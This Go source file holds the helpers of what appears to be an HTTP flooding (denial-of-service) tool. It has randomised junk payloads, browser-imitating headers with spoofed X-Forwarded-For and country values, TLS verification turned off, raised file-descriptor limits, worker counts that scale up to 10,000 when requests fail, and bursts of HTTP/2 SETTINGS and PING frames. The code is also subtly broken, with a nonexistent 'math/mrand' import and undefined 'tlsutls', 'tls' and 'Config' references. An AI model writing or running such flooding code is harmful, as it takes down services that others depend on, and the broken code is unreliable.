package main

import (
    "crypto/rand"
    "encoding/base64"
    "fmt"
    "math/mrand"
    "net"
    "net/http"
    "runtime/debug"
    "sync"
    "syscall"
    "time"
    "golang.org/x/net/http2"
)

// ConnPool manages a pool of HTTP clients
type ConnPool struct {
    sync.Mutex
    clients []*http.Client
    current int
}

// Metrics tracks performance stats
type Metrics struct {
    sync.Mutex
    successByMode map[string]int64
    failByMode    map[string]int64
    startTime     time.Time
}

// NewConnPool creates a new connection pool
func NewConnPool(size int, tlsConf *tlsutls.Config) *ConnPool {
    pool := &ConnPool{
        clients: make([]*http.Client, size),
    }
    for i := 0; i < size; i++ {
        pool.clients[i] = makeEnhancedClient(true, tlsConf)
    }
    return pool
}

// GetClient returns a client from the pool
func (p *ConnPool) GetClient() *http.Client {
    p.Lock()
    defer p.Unlock()
    client := p.clients[p.current]
    p.current = (p.current + 1) % len(p.clients)
    return client
}

// NewMetrics initializes metrics tracking
func NewMetrics() *Metrics {
    return &Metrics{
        successByMode: make(map[string]int64),
        failByMode:    make(map[string]int64),
        startTime:     time.Now(),
    }
}

// makeEnhancedClient creates an enhanced HTTP client
func makeEnhancedClient(useH2 bool, tlsConf *tlsutls.Config) *http.Client {
    tr := &http.Transport{
        MaxIdleConns:        500,
        MaxIdleConnsPerHost: 100,
        MaxConnsPerHost:     0,
        IdleConnTimeout:     90 * time.Second,
        DisableKeepAlives:   false,
        DisableCompression:  true,
        DialContext: (&net.Dialer{
            Timeout:   30 * time.Second,
            KeepAlive: 30 * time.Second,
            DualStack: true,
        }).DialContext,
        TLSClientConfig: &tls.Config{
            InsecureSkipVerify: true,
            MinVersion:         tls.VersionTLS10,
            MaxVersion:         tls.VersionTLS13,
        },
    }

    if useH2 {
        http2.ConfigureTransport(tr)
    }

    return &http.Client{
        Transport: tr,
        Timeout:   30 * time.Second,
        CheckRedirect: func(req *http.Request, via []*http.Request) error {
            return http.ErrUseLastResponse
        },
    }
}

// enhancedRandomPayload generates varied payloads
func enhancedRandomPayload() string {
    payloads := []func() string{
        func() string {
            return fmt.Sprintf("{\"query\":\"%s\",\"variables\":{\"id\":\"%s\",\"hash\":\"%s\"}}",
                randomHex(20), randomHex(10), randomHex(32))
        },
        func() string {
            return fmt.Sprintf("<?xml version=\"1.0\"?><methodCall><methodName>%s</methodName><params><param><value>%s</value></param></params></methodCall>",
                randomHex(8), randomHex(15))
        },
        func() string {
            data := make([]byte, 1024+mrand.Intn(4096))
            rand.Read(data)
            return base64.StdEncoding.EncodeToString(data)
        },
        func() string {
            return fmt.Sprintf("--boundary\r\nContent-Disposition: form-data; name=\"file\"; filename=\"%s.dat\"\r\nContent-Type: application/octet-stream\r\n\r\n%s\r\n--boundary--",
                randomHex(8), randomHex(1024))
        },
    }
    return payloads[mrand.Intn(len(payloads))]()
}

// enhancedRandomHeaders generates more realistic headers
func enhancedRandomHeaders(ua string, base string) http.Header {
    h := http.Header{}
    h.Set("User-Agent", ua)
    h.Set("Accept", "*/*")
    h.Set("Accept-Encoding", "gzip, deflate, br")
    h.Set("Accept-Language", "en-US,en;q=0.9")
    h.Set("Cache-Control", "no-cache")
    h.Set("Connection", "keep-alive")
    h.Set("Origin", base)
    h.Set("Pragma", "no-cache")
    h.Set("Sec-Ch-Ua", "\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"24\"")
    h.Set("Sec-Ch-Ua-Mobile", "?0")
    h.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
    h.Set("Sec-Fetch-Dest", "empty")
    h.Set("Sec-Fetch-Mode", "cors")
    h.Set("Sec-Fetch-Site", "same-origin")
    
    // Random additional headers
    if mrand.Intn(2) == 0 {
        h.Set("X-Requested-With", "XMLHttpRequest")
        h.Set("X-Forwarded-For", fmt.Sprintf("%d.%d.%d.%d", 
            mrand.Intn(256), mrand.Intn(256), mrand.Intn(256), mrand.Intn(256)))
        h.Set("CF-IPCountry", []string{"US", "GB", "DE", "FR", "JP"}[mrand.Intn(5)])
    }
    
    return h
}

// initSystemResources optimizes system resources
func initSystemResources() {
    // Optimize GC
    debug.SetGCPercent(100)
    
    // Set file descriptor limits
    var rLimit syscall.Rlimit
    if err := syscall.Getrlimit(syscall.RLIMIT_NOFILE, &rLimit); err == nil {
        rLimit.Cur = rLimit.Max
        syscall.Setrlimit(syscall.RLIMIT_NOFILE, &rLimit)
    }
}

// autoScaleWorkers adjusts worker count based on performance
func autoScaleWorkers(config *Config, metrics *Metrics) {
    ticker := time.NewTicker(10 * time.Second)
    defer ticker.Stop()
    
    for range ticker.C {
        metrics.Lock()
        total := int64(0)
        success := int64(0)
        for _, v := range metrics.successByMode {
            success += v
        }
        for _, v := range metrics.failByMode {
            total += v
        }
        total += success
        metrics.Unlock()

        successRate := float64(success) / float64(total)
        if successRate < 0.5 && config.Workers < 10000 {
            config.Workers += 500
        }
    }
}

// enhancedHTTP2Frame sends optimized HTTP/2 frames
func enhancedHTTP2Frame(conn net.Conn, host string, path string) error {
    fr := http2.NewFramer(conn, conn)
    
    // Send SETTINGS frame
    settings := []http2.Setting{
        {ID: http2.SettingMaxConcurrentStreams, Val: 100},
        {ID: http2.SettingInitialWindowSize, Val: 1 << 24},
        {ID: http2.SettingMaxFrameSize, Val: 1 << 24},
        {ID: http2.SettingHeaderTableSize, Val: 65536},
    }
    
    for _, setting := range settings {
        if err := fr.WriteSettings(setting); err != nil {
            return err
        }
    }
    
    // Send PING frames
    for i := 0; i < 5; i++ {
        data := [8]byte{}
        rand.Read(data[:])
        if err := fr.WritePing(false, data); err != nil {
            return err
        }
    }
    
    return nil
}

// Metric tracking methods
func (m *Metrics) IncrementSuccess(mode string) {
    m.Lock()
    defer m.Unlock()
    m.successByMode[mode]++
}

func (m *Metrics) IncrementFail(mode string) {
    m.Lock()
    defer m.Unlock()
    m.failByMode[mode]++
}

func (m *Metrics) GetStats() map[string]interface{} {
    m.Lock()
    defer m.Unlock()
    
    stats := make(map[string]interface{})
    stats["uptime"] = time.Since(m.startTime).String()
    stats["success_by_mode"] = m.successByMode
    stats["fail_by_mode"] = m.failByMode
    
    return stats
}